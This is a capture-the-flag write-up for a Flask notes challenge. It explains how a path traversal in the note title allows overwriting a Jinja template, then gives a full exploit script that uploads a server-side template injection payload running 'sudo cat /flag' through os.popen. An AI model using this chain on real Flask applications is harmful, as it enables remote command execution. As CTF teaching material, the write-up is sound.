# BAD NOTES (UNINTENDED)
### Description
```
In this write up we can learn flask behavior on render_template
```
###

```py
def isSecure(title):
    D_extns = ['py','sh']
    D_chars = ['*','?','[',']']
    extension = title.split('.')[-1]
    if(extension in D_extns):
        return False
    for char in title:
        if char in D_chars:
            return False
    return True

def upload():
    try:
        if(session.get("loggedin") != "true"):
            return redirect('/login',code=302)
        title = request.form.get('title')
        content = base64.b64decode(request.form.get('content'))
        if(title == None or title==""):
            return render_template('dashboard.html',err_msg="title cannot be empty"),402
        if(not isSecure(title)):
            return render_template('dashboard.html',err_msg="invalid title")
        file_path = os.path.join(UPLOAD_FOLDER,session.get('id'))
        notes_list = os.listdir(file_path)
        try:
            file = os.path.join(file_path,title)
            if('caches' in os.path.abspath(file)):
                return render_template('dashboard.html',err_msg="invalid title",notes = notes_list),400
            with open(file,"wb") as f:
                f.write(content)
                ## WE CAN OVERRIDE TEMPLATE WITH THIS VULN on isSecure function there no filter to ../
        except Exception as e:
            print(f"ERROR: {e}",flush=True)
            return render_template('dashboard.html',err_msg="Some error occured",notes = notes_list),400
        return redirect('/dashboard',code=302)
    except Exception as e:
        print(f"ERROR: {e}",flush=True)
        return "You broke the server :(",400
```

```text
We're able to override templates/register.html using the vuln
and the next vuln will explain why we can use Arbitrary file write in this server
```

```py
@app.route('/register',methods=["GET","POST"])
def register():
    try:
        if(request.method == "POST"):
            user = request.form.get("username").strip()
            passw = request.form.get("password").strip()
            cursor,conn = getDB()
            rows = cursor.execute("SELECT username FROM accounts WHERE username = ?",(user,)).fetchall()
            if rows:
                return render_template('register.html',message="user already exists")
            direc_id = str(uuid.uuid4())
            query = "INSERT INTO accounts VALUES(?,?,?)"
            res = cursor.execute(query,(user,passw,direc_id))
            conn.commit()
            if(res):
                os.mkdir(os.path.join(UPLOAD_FOLDER,direc_id))
                return redirect('/login')
        return render_template('register.html')
    except Exception as e:
        print(f"ERROR: {e}",flush=True)
        return "You broke the server :(",400
```

```text
render_template will save the content of the file after executed
so if the render_template executed, everytime the file was edited its not
affected the last content of the file


we can see render_template will executed if some condition,
1. if rows: ( if the username exists)
2. if request.method is not POST

but if the request.method is POST and username is not exist, the server
directly go to /login, then the render_template of register.html never
executed

therefore we can override the register.html then trigger the
render_template('register.html') after we override the file
```

## SOLUTION
```py
import requests
import base64


payload = base64.b64encode("{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"sudo cat /flag\").read()}}{%endif%}{% endfor %}".encode())

req = requests.Session()
url = "https://ch2189141741.ch.eng.run"

headers = {
    "Content-type":"application/x-www-form-urlencoded"
}
data = {
    "username":"1",
    "password":"1"
}
print(req.post(url+"/register", data=data, allow_redirects=False).text)
print(req.post(url+"/login", data=data, allow_redirects=False).text)
data = {
    "title":"../../templates/register.html",
    "content":payload
}
print(req.post(url+"/makenote", data=data, allow_redirects=False).text)

print(requests.get(url+"/register").text)
```